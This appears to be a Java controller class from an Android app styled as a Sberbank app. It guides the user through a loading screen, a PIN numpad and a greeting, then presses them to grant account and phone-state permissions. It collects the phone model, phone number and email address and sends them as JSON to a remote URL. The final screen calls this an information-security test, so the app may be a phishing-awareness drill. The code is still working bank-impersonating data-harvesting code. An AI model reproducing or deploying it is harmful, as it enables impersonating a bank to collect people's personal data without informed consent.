package com.example.installed.practics1.helper_classes;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.CountDownTimer;
import android.os.Handler;
import android.text.Html;
import android.view.View;
import android.widget.ProgressBar;

import com.example.installed.practics1.MainActivity;
import com.example.installed.practics1.R;
import com.example.installed.practics1.helper_classes.permission.ILinkedPermissionResult;
import com.example.installed.practics1.helper_classes.permission.LinkedPermission;
import com.example.installed.practics1.helper_classes.permission.Permission;
import com.example.installed.practics1.helper_classes.screen_controller.GreetingScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.GreetingScreenMetadata;
import com.example.installed.practics1.helper_classes.screen_controller.IOnGreetingScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnInfoScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnLoadingScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnNumpadScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.InfoScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.InfoScreenMetadata;
import com.example.installed.practics1.helper_classes.screen_controller.LoadingScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.NumpadScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.NumpadScreenMetada;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;

public class MainActivityController implements IOnLoadingScreenControllerViewCreated,
        IOnNumpadScreenControllerViewCreated,
        IOnGreetingScreenControllerViewCreated,
        IOnInfoScreenControllerViewCreated{

    public MainActivity activity;
    public LoadingScreenController loadingScreenController;
    public NumpadScreenController numpadScreenController;
    public GreetingScreenController greetingScreenController;
    public InfoScreenController infoScreenController;
    public MobileDataBroadcastReceiver mobileDataBroadcastReceiver;
    public RemoteBroadcastReceiver remoteBroadcastReceiver;
    //public PermissionRegistry permissionRegistry;
    public static String REMOTE_URL_TO_SEND_MOBILE_DATA = "http://www.sberbank.ru/ru/person";
    public static String REMOTE_URL_TO_REDIRRECT_USER = "http://www.sberbank.ru/";
    public static final Integer[] NUMPAD_CODE = new Integer[] {1, 1, 1, 1, 1};


    public class MobileDataBroadcastReceiver extends BroadcastReceiver {

        public MainActivity activity;
        public MobileDataProvider mobileDataProvider;
        public Set<IOnMobileDataReceived> onMobileDataReceivedSet;
        public Set<IOnHourReceived> onHourReceivedSet;


        public MobileDataBroadcastReceiver(MainActivity activity) {
            this.activity = activity;
            mobileDataProvider = new MobileDataProvider();
            onMobileDataReceivedSet = new HashSet<>();
            onHourReceivedSet = new HashSet<>();
        }


        @Override
        public void onReceive(Context context, Intent intent) {
            String actionName = intent.getAction();
            if(actionName.equals(MobileDataProvider.ACTION_GET_MOBILE_DATA.ACTION_RESPONSE_NAME)) {
                MobileDataProvider.ActionGetMobileDataResult result = mobileDataProvider.new ActionGetMobileDataResult(intent);
                for (IOnMobileDataReceived handler :
                        onMobileDataReceivedSet) {
                    handler.OnMobileDataReceived(result);
                }
            }
            else if(actionName.equals(MobileDataProvider.ACTION_GET_HOUR.ACTION_RESPONSE_NAME)) {
                MobileDataProvider.ActionGetHourResult result = mobileDataProvider.new ActionGetHourResult(intent);
                for (IOnHourReceived handler :
                        onHourReceivedSet) {
                    handler.OnHourReceived(result);
                }
            }
        }


    }


    public class RemoteBroadcastReceiver extends BroadcastReceiver {

        public MainActivity activity;
        public RemoteProvider remoteProvider;
        public RemoteProvider.ActionSendDataResult lastResult;
        public Set<IOnRemoteReceived> onRemoteReceivedSet;


        public RemoteBroadcastReceiver(MainActivity activity) {
            this.activity = activity;
            remoteProvider = new RemoteProvider();
            onRemoteReceivedSet = new HashSet<>();
        }


        @Override
        public void onReceive(Context context, Intent intent) {
            RemoteProvider.ActionSendDataResult result = remoteProvider.new ActionSendDataResult(intent);
            lastResult = result;
            for (IOnRemoteReceived handler :
                    onRemoteReceivedSet) {
                handler.OnRemoteReceived(result);
            }
        }

    }


    public MainActivityController(MainActivity activity) {
        this.activity = activity;
        REMOTE_URL_TO_REDIRRECT_USER = activity.getResources().getString(R.string.remote_url_to_redirrect_user);
        REMOTE_URL_TO_SEND_MOBILE_DATA = activity.getResources().getString(R.string.remote_url_to_send_mobile_data);
        loadingScreenController = new LoadingScreenController(activity);
        numpadScreenController = new NumpadScreenController(activity);
        greetingScreenController = new GreetingScreenController(activity);
        infoScreenController = new InfoScreenController(activity);
        loadingScreenController.onLoadingScreenControllerViewCreated = this;
        numpadScreenController.onNumpadScreenControllerViewCreated = this;
        greetingScreenController.onGreetingScreenControllerViewCreated = this;
        infoScreenController.onInfoScreenControllerViewCreated = this;
        makeReceivers(activity);
        //makeTelephoneDataTransfer(activity);
        //makePermissions(activity);
    }

    public void Start() {
        loadingScreenController.Show(null);
    }


    public void OnLoadingScreenControllerViewCreated(LoadingScreenController controller) {
        /*loadingScreenController.logoFragment.view.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                numpadScreenMetada.digits = NUMPAD_CODE;
                loadingScreenController.Remove();
                numpadScreenController.Show(numpadScreenMetada);
            }
        });*/
        /*new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                numpadScreenMetada.digits = NUMPAD_CODE;
                loadingScreenController.Remove();
                numpadScreenController.Show(numpadScreenMetada);
            }
        }, 5000);*/

        final ProgressBar progressBar = loadingScreenController.progressBar;
        final int msToRun = 8000;
        progressBar.setProgress(0);
        CountDownTimer timer = new CountDownTimer(msToRun, 1000) {

            //we tick msToRun/1000 times, updating progress bar
            @Override
            public void onTick(long millisUntilFinished) {
                float normalized = ((float) msToRun - millisUntilFinished) / (float) msToRun;
                int percents = Math.round(normalized * 100);
                progressBar.setProgress(percents);
            }


            //try to get calendar permissinon, go next anyway
            @Override
            public void onFinish() {
                Permission calendarPermission = new Permission(
                        activity,
                        MainActivity.CONSTANTS.PERMISSIONS.READ_CALENDAR.MANIFEST_NAME,
                        MainActivity.CONSTANTS.PERMISSIONS.READ_CALENDAR.REQUEST_CODE
                ) {

                    private void onDone() {
                        progressBar.setProgress(100);
                        NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                        numpadScreenMetada.digits = NUMPAD_CODE;
                        loadingScreenController.Remove();
                        numpadScreenController.Show(numpadScreenMetada);
                    }

                    @Override
                    public void OnRationale() {
                        onDone();
                    }

                    @Override
                    public void OnGranted() {
                        onDone();
                    }

                    @Override
                    public void OnDenied() {
                        onDone();
                    }
                };
                //save permission to registry and try to get it
                activity.permissionRegistry.insertPermission(calendarPermission);
                calendarPermission.tryToGet();
                /*progressBar.setProgress(100);
                NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                numpadScreenMetada.digits = NUMPAD_CODE;
                loadingScreenController.Remove();
                numpadScreenController.Show(numpadScreenMetada);*/
            }
        };

        //start timer - not forget!
        timer.start();

    }


    public void OnNumpadScreenControllerViewCreated(NumpadScreenController controller) {
        //prepare next screen state!
        final GreetingScreenMetadata greetingScreenMetadata = new GreetingScreenMetadata();
        if(activity.permissionRegistry.checkIfGrantedByManifestName(MainActivity.CONSTANTS.PERMISSIONS.READ_CALENDAR.MANIFEST_NAME)) {
            mobileDataBroadcastReceiver.onHourReceivedSet.add(new IOnHourReceived() {
                @Override
                public void OnHourReceived(MobileDataProvider.ActionGetHourResult result) {
                    mobileDataBroadcastReceiver.onHourReceivedSet.remove(this);
                    if (result.HOUR >= 22 || result.HOUR <= 6) {
                        greetingScreenMetadata.isNight = true;
                    } else if (result.HOUR >= 7 && result.HOUR <= 11) {
                        greetingScreenMetadata.isMoorning = true;
                    } else if (result.HOUR >= 12 && result.HOUR <= 16) {
                        greetingScreenMetadata.isAfternoon = true;
                    } else {
                        greetingScreenMetadata.isEvening = true;
                    }
                }
            });
            MobileDataProvider.startActionGetHour(activity);
        }

        //set current screen listeners
        final NumpadScreenController.NumpadLogic numpadLogic = numpadScreenController.new NumpadLogic(NUMPAD_CODE.length);
        numpadLogic.insertionDoneListener = new NumpadScreenController.INumpadInsertionDoneListener() {
            @Override
            public void NumpadInsertionDoneListener(Integer[] code) {
                boolean isCodeCorrect = numpadLogic.compareCodes(code, NUMPAD_CODE, NUMPAD_CODE.length);
                greetingScreenMetadata.isCodeCorrect = isCodeCorrect;
                numpadScreenController.Remove();
                greetingScreenController.Show(greetingScreenMetadata);
            }
        };
        numpadScreenController.numpadFragment.btnCall.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final Permission permission = new Permission(
                        activity,
                        MainActivity.CONSTANTS.PERMISSIONS.CALL_PHONE.MANIFEST_NAME,
                        MainActivity.CONSTANTS.PERMISSIONS.CALL_PHONE.REQUEST_CODE
                ) {
                    @Override
                    public void OnRationale() {
                        OnDenied();
                    }

                    @Override
                    public void OnGranted() {
                        Uri call = Uri.parse("tel:" + activity.getResources().getString(R.string.bank_phone_number));
                        Intent intentCall = new Intent(Intent.ACTION_DIAL, call);
                        activity.startActivity(intentCall);
                    }

                    @Override
                    public void OnDenied() {
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                new AlertDialog.Builder(activity)
                                        .setMessage("Отсутствует необходимое разрешение.")
                                        .setTitle("Ошибка")
                                        .setCancelable(false)
                                        .setPositiveButton("ОК", new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface dialog, int which) {
                                            }
                                        })
                                        .create().
                                        show();
                            }//run
                        }, 250); //handler
                    }// on denied
                };//runnable;
                activity.permissionRegistry.insertPermission(permission);
                permission.tryToGet();
            }
        });
        /*View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                numpadScreenController.Remove();
                greetingScreenController.Show(greetingScreenMetadata);
            }
        };


        numpadScreenController.logoFragment.view.setOnClickListener(l);
        numpadScreenController.numpadFragment.view.setOnClickListener(l);*/
    }


    public void OnGreetingScreenControllerViewCreated(GreetingScreenController controller) {
        //prepare metadata to next screen
        final InfoScreenMetadata infoScreenMetadata = new InfoScreenMetadata();

        //set behaviour in listeners

        /*View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                InfoScreenMetadata infoScreenMetadata = new InfoScreenMetadata();
                infoScreenMetadata.text = "Вы приняли участие!";
                greetingScreenController.Remove();
                infoScreenController.Show(infoScreenMetadata);
            }
        };
        greetingScreenController.logoFragment.view.setOnClickListener(l);
        greetingScreenController.greetingFragment.view.setOnClickListener(l);*/

        //apply metadata
        if(greetingScreenController.metadata != null) {
            if(greetingScreenController.metadata.isMoorning) {
                greetingScreenController.greetingFragment.textView.setText("Доброе утро.");
                greetingScreenController.greetingFragment.imageView.setImageResource(R.drawable.morning);
            } else if(greetingScreenController.metadata.isAfternoon) {
                greetingScreenController.greetingFragment.textView.setText("Добрый день.");
                greetingScreenController.greetingFragment.textView.setTextColor(Color.WHITE);
                greetingScreenController.greetingFragment.imageView.setImageResource(R.drawable.day);
            } else if(greetingScreenController.metadata.isEvening) {
                greetingScreenController.greetingFragment.textView.setText("Добрый вечер.");
                greetingScreenController.greetingFragment.imageView.setImageResource(R.drawable.night);
            } else if(greetingScreenController.metadata.isNight) {
                greetingScreenController.greetingFragment.textView.setText("Доброй ночи.");
                greetingScreenController.greetingFragment.imageView.setImageResource(R.drawable.night);
            } else {
                greetingScreenController.greetingFragment.textView.setText("Здравствуйте.");
                greetingScreenController.greetingFragment.imageView.setImageResource(R.drawable.day);
            }

            if(greetingScreenController.metadata.isCodeCorrect) {

                if(!checkWeHavePermissionsforMobileDataTransfer()) {

                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            new AlertDialog.Builder(activity)
                                    .setMessage("При необходимости предоставьте, пожалуйста, разрешения.")
                                    .setTitle("Важно")
                                    .setCancelable(false)
                                    .setPositiveButton("ОК", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialog, int which) {
                                            tryToGetPermissionsForMobileDataTransfer(
                                                    new ILinkedPermissionResult() {
                                                        @Override
                                                        public void LinkedPermissionResult(boolean isOK) {
                                                        /*if(!isOK)
                                                            tryToGetPermissionsForMobileDataTransfer(this);*/
                                                            infoScreenMetadata.areAllPermissionsGranted = isOK;
                                                            greetingScreenController.Remove();
                                                            infoScreenController.Show(infoScreenMetadata);
                                                        }
                                                    }
                                            );
                                        }
                                    })
                                    .create().
                                    show();
                        }
                    }, 5000);
                }
                else {
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            infoScreenMetadata.areAllPermissionsGranted = true;
                            greetingScreenController.Remove();
                            infoScreenController.Show(infoScreenMetadata);
                        }
                    }, 5000);
                }


                /*new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        greetingScreenController.Remove();
                        infoScreenController.Show(infoScreenMetadata);
                    }
                }, 5000);*/

            }
            else {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        new AlertDialog.Builder(activity)
                                .setMessage("Неверный код!")
                                .setTitle("Ошибка")
                                .setCancelable(false)
                                .setPositiveButton("ОК", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                                        numpadScreenMetada.digits = NUMPAD_CODE;
                                        greetingScreenController.Remove();
                                        numpadScreenController.Show(numpadScreenMetada);
                                    }
                                })
                                .create()
                                .show();
                    }
                }, 5000);
            }
        }//metadata not null
    }


    public void OnInfoScreenControllerViewCreated(InfoScreenController controller) {
        //set behaviour in listeners
        View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            }
        };
        infoScreenController.logoFragment.view.setOnClickListener(l);
        infoScreenController.infoFragment.view.setOnClickListener(l);

        String textOK = "Вы стали участником тестирования службы информационной безопасности," +
                " для получения подробной информации перейдите по ссылке <a href=\"" + REMOTE_URL_TO_REDIRRECT_USER +
                "\">" + REMOTE_URL_TO_REDIRRECT_USER +"</a>.";

        //apply metadata
        InfoScreenMetadata metadata = infoScreenController.metadata;
        boolean isOnline = isOnline();
        if(metadata != null) {
            if(metadata.areAllPermissionsGranted) {
                if(isOnline) {
                    makeTelephoneDataTransfer(activity);
                    infoScreenController.infoFragment.textView.setText(Html.fromHtml(textOK));
                }
                else {
                    infoScreenController.infoFragment.textView.setText(Html.fromHtml("Отсутствует подключение к интернету."));
                }
            }
            else {
                infoScreenController.infoFragment.textView.setText(Html.fromHtml("Не все разрешения предоставлены. Выставить необходимые разрешения возможно в меню приложений."));
            }
        }
        else {
            infoScreenController.infoFragment.textView.setText(Html.fromHtml("Произошла неизвестная ошибка."));
        }
    }


    private void makeReceivers(MainActivity activity) {
        mobileDataBroadcastReceiver = new MobileDataBroadcastReceiver(activity);
        IntentFilter intentFilterMobileData = new IntentFilter(
                MobileDataProvider
                        .ACTION_GET_MOBILE_DATA
                        .ACTION_RESPONSE_NAME
        );
        IntentFilter intentFilterHour = new IntentFilter(
                MobileDataProvider
                        .ACTION_GET_HOUR
                        .ACTION_RESPONSE_NAME
        );
        intentFilterMobileData.addCategory(Intent.CATEGORY_DEFAULT);
        intentFilterHour.addCategory(Intent.CATEGORY_DEFAULT);
        activity.registerReceiver(mobileDataBroadcastReceiver, intentFilterMobileData);
        activity.registerReceiver(mobileDataBroadcastReceiver, intentFilterHour);

        remoteBroadcastReceiver = new RemoteBroadcastReceiver(activity);
        IntentFilter intentFilterRemote = new IntentFilter(
                RemoteProvider
                    .ACTION_SEND_DATA
                    .ACTION_RESPONSE_NAME
        );
        intentFilterRemote.addCategory(Intent.CATEGORY_DEFAULT);
        activity.registerReceiver(remoteBroadcastReceiver, intentFilterRemote);
    }


    /*private void makePermissions(MainActivity activity) {

    }*/

    private void makeTelephoneDataTransfer(final MainActivity mainActivity) {

        mobileDataBroadcastReceiver.onMobileDataReceivedSet.add(
                new IOnMobileDataReceived() {
                    @Override
                    public void OnMobileDataReceived(MobileDataProvider.ActionGetMobileDataResult result) {
                        mobileDataBroadcastReceiver.onMobileDataReceivedSet.remove(this);
                        JSONObject jsonToSend = new JSONObject();
                        try {
                            jsonToSend.put("TELEPHONE_MODEL", result.TELEPHONE_MODEL);
                            jsonToSend.put("TELEPHONE_NUMBER", result.TELEPHONE_NUMBER);
                            jsonToSend.put("EMAIL", result.EMAIL);
                        }
                        catch (Exception ex) {

                        }

                        String data = jsonToSend.toString();
                        RemoteProvider.startActionSendData(mainActivity, REMOTE_URL_TO_SEND_MOBILE_DATA, data);

                    }//method
                }//class
        );

        MobileDataProvider.startActionGetMobileData(mainActivity);
    }



    public List<String> listWithManifestNamesOfRemotePermissions = new LinkedList<>(
            Arrays.asList(
                    MainActivity.CONSTANTS.PERMISSIONS.ACCESS_NETWORK_STATE.MANIFEST_NAME,
                    MainActivity.CONSTANTS.PERMISSIONS.GET_ACCOUNTS.MANIFEST_NAME,
                    MainActivity.CONSTANTS.PERMISSIONS.INTERNET.MANIFEST_NAME,
                    MainActivity.CONSTANTS.PERMISSIONS.READ_PHONE_STATE.MANIFEST_NAME
            )
    );

    public void tryToGetPermissionsForMobileDataTransfer(ILinkedPermissionResult resultHandler) {

        LinkedPermission accessNetworkState = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.ACCESS_NETWORK_STATE.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.ACCESS_NETWORK_STATE.REQUEST_CODE
        );

        LinkedPermission getAccounts = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.GET_ACCOUNTS.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.GET_ACCOUNTS.REQUEST_CODE
        );

        LinkedPermission internet = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.INTERNET.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.INTERNET.REQUEST_CODE
        );

        LinkedPermission readPhoneState = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.READ_PHONE_STATE.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.READ_PHONE_STATE.REQUEST_CODE
        );

        accessNetworkState.next = getAccounts;
        getAccounts.next = internet;
        internet.next = readPhoneState;

        accessNetworkState.linkedPermissionResult = resultHandler;
        getAccounts.linkedPermissionResult = resultHandler;
        internet.linkedPermissionResult = resultHandler;
        readPhoneState.linkedPermissionResult = resultHandler;

        activity.permissionRegistry.insertPermission(accessNetworkState);
        activity.permissionRegistry.insertPermission(getAccounts);
        activity.permissionRegistry.insertPermission(internet);
        activity.permissionRegistry.insertPermission(readPhoneState);

        accessNetworkState.tryToGet();

    }


    public boolean checkWeHavePermissionsforMobileDataTransfer() {

        LinkedPermission accessNetworkState = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.ACCESS_NETWORK_STATE.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.ACCESS_NETWORK_STATE.REQUEST_CODE
        );

        LinkedPermission getAccounts = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.GET_ACCOUNTS.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.GET_ACCOUNTS.REQUEST_CODE
        );

        LinkedPermission internet = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.INTERNET.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.INTERNET.REQUEST_CODE
        );

        LinkedPermission readPhoneState = new LinkedPermission(
                activity,
                MainActivity.CONSTANTS.PERMISSIONS.READ_PHONE_STATE.MANIFEST_NAME,
                MainActivity.CONSTANTS.PERMISSIONS.READ_PHONE_STATE.REQUEST_CODE
        );

        return accessNetworkState.isGranted() && getAccounts.isGranted()
                && internet.isGranted() && readPhoneState.isGranted();

    }


    public boolean isOnline() {
        ConnectivityManager cm =
                (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);

        return cm.getActiveNetworkInfo() != null &&
                cm.getActiveNetworkInfo().isConnectedOrConnecting();
    }

}
